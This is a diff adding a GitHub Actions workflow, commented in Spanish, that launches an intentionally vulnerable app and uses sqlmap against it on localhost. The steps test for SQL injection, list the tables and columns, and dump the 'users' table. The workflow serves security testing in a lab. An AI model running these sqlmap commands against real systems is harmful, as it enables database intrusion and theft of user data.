@@ -1,0 +1,74 @@
+# .github/workflows/sast-sqlmap-scan.yml
+
+name: Análisis de Seguridad con sqlmap
+
+# Disparadores del workflow:
+# 1. Cuando se hace push a la rama 'main'
+# 2. Permite la ejecución manual desde la pestaña Actions en GitHub
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  sast-sqlmap-scan:
+    # El tipo de ejecutor (runner) que usará el job
+    runs-on: ubuntu-latest
+
+    steps:
+      # 1. Checkout del código de tu repositorio
+      # Para que el workflow tenga acceso a tus archivos (app.py, docker-compose.yml, etc.)
+      - name: Checkout del repositorio
+        uses: actions/checkout@v4
+
+      # 2. Levantar el entorno con Docker Compose
+      # Ejecuta el docker-compose.yml para iniciar la app vulnerable y la DB.
+      # El '-d' (detached) es crucial para que el workflow continúe al siguiente paso.
+      - name: Iniciar servicios con Docker Compose
+        run: docker-compose up -d
+
+      # 3. Esperar a que los servicios se inicien
+      # Es una buena práctica dar tiempo a que la base de datos se inicialice
+      # y la aplicación se conecte a ella. 30 segundos es un tiempo prudente.
+      - name: Esperar a que los servicios estén listos
+        run: |
+          echo "Esperando 30 segundos a que la base de datos y la app se inicien..."
+          sleep 30
+          echo "Verificando los contenedores en ejecución..."
+          docker ps
+
+      # 4. Clonar el repositorio de sqlmap
+      # Tal como lo hiciste localmente, clonamos sqlmap para poder usarlo.
+      # --depth 1 lo hace más rápido al clonar solo la última versión.
+      - name: Clonar sqlmap
+        run: git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+      # 5. Ejecutar el escaneo con sqlmap
+      # Replicamos los comandos que usaste, apuntando a la app que ahora corre
+      # en 'localhost' dentro del runner de GitHub Actions.
+      - name: Ejecutar comandos de sqlmap
+        run: |
+          echo "--- [Paso 1/4] Probando conectividad e inyección inicial ---"
+          python3 sqlmap-dev/sqlmap.py -u "http://localhost:5000/user?id=1" -p id --level 5 --risk 3 --batch
+
+          echo "--- [Paso 2/4] Listando las tablas de la base de datos 'testdb' ---"
+          python3 sqlmap-dev/sqlmap.py -u "http://localhost:5000/user?id=1" -p id -D testdb --tables --batch
+
+          echo "--- [Paso 3/4] Listando las columnas de la tabla 'users' ---"
+          python3 sqlmap-dev/sqlmap.py -u "http://localhost:5000/user?id=1" -p id -D testdb -T users --columns --batch
+          
+          echo "--- [Paso 4/4] Extrayendo los datos (dump) de la tabla 'users' ---"
+          python3 sqlmap-dev/sqlmap.py -u "http://localhost:5000/user?id=1" -p id -D testdb -T users --dump --batch
+
+      # Opcional: Si quieres que el pipeline falle si se encuentra una inyección.
+      # Este paso busca la cadena "[INFO] the back-end DBMS is" en la salida del log de sqlmap
+      # y si la encuentra, falla el pipeline.
+      # - name: Verificar si se encontró una vulnerabilidad
+      #   run: |
+      #     if grep -q "the back-end DBMS is" "sqlmap-dev/output/localhost/log"; then
+      #       echo "¡Vulnerabilidad SQLi encontrada! Fallando el pipeline."
+      #       exit 1
+      #     else
+      #       echo "No se encontraron vulnerabilidades SQLi."
+      #     fi
